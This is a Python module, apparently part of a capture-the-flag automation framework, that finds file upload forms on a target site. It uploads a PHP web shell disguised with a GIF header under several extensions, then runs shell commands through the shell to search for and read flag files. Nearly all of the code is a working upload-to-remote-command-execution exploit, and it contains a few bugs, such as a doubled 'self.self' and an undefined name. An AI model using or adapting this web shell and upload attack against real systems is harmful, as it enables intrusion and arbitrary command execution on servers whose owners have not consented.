from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web as web
import requests
import magic
import units

class Unit(web.WebUnit):

	PRIORITY = 60

	def __init__(self, katana, parent, target):
		super(Unit, self).__init__(katana, parent, target)

		# Check if there is even file upload functionality present
		self.raw_content = self.target.content.decode('utf-8')
		self.upload = re.findall(r"enctype=['\"]multipart/form-data['\"]", self.raw_content, flags=re.IGNORECASE)

		if not self.upload:
			# If not, don't bother with this unit
			raise units.NotApplicable


	def enumerate(self, katana):
		
		# This should "yield 'name', (params,to,pass,to,evaluate)"
		# evaluate will see this second argument as only one variable and you will need to parse them out
		
		action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.raw_content, flags=re.IGNORECASE)
		method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.raw_content, flags=re.IGNORECASE)
		upload = self.upload

		file_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(web.potential_file_variables)
		file = re.findall(file_regex, self.raw_content, flags=re.IGNORECASE)

		if not file:
			# JOHN: We can't find a filename variable. Maybe it's not in our list yet!
			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.

		if action and method and upload and file:
			if action: action = action[0]
			if action.startswith(self.target.url_root): action = action[len(self.target.url_root):]
			if method: method = method[0]
			if file: file = file[0]

			try:
				method = vars(requests)[method.lower()]
			except IndexError:
				log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
				method = requests.post

			extensions = ['php', 'gif', 'php3', 'php5', 'php7']

			for ext in extensions:
				r = method(self.target.upstream.decode('utf-8').rstrip('/')+ '/' + action, files = {file: ('anything.%s' % ext, 
					StringIO(f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'), 'image/gif' ) })

				potential_location_regex = 'href=["\'](.+?.%s)["\']' % ext

				location = re.findall(potential_location_regex, r.text, flags=re.IGNORECASE )
				if location:
					for file_path in location:
						if file_path.startswith(self.target.url_root): file_path = file_path[len(self.self.target.url_root):]
						yield (method, action, file, ext, location, file_path)

		else:
			return  # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, katana, case):
		# Split up the self.target (see get_cases)
		method, action, file, ext, location, file_path = case

		r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
					params = { 'c' : f'/bin/echo -n {web.special}' })

		if f'{web.delim}{web.special}{web.delim}' in r.text:
			for flagname in potential_flag_names:
				r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
				params = { 'c' : f'find / -name {flagname}' })

				flag_locations = re.findall(f'{web.delim}(.+?){web.delim}', r.text, flags = re.MULTILINE | re.DOTALL )

				if flag_locations:
					flag_locations = flag_locations[0]

					for fl in flag_locations.split('\n'):
						fl = fl.strip()
					
						r = requests.get(self.target.url_root.rstrip('/')+'/' + file_path,
							params = { 'c' : f'cat {fl}' })

						flag = re.findall(f'{web.delim}(.+?){web.delim}', r.text, flags = re.MULTILINE | re.DOTALL )
						if flag:
							flag = flag[0]
							katana.add_results(self, flag)
							if katana.locate_flags(self, flag):
								self.completed = True

		# You should ONLY return what is "interesting" 
		# Since we cannot gauge the results of this payload versus the others,
		# we will only care if we found the flag.
		return None
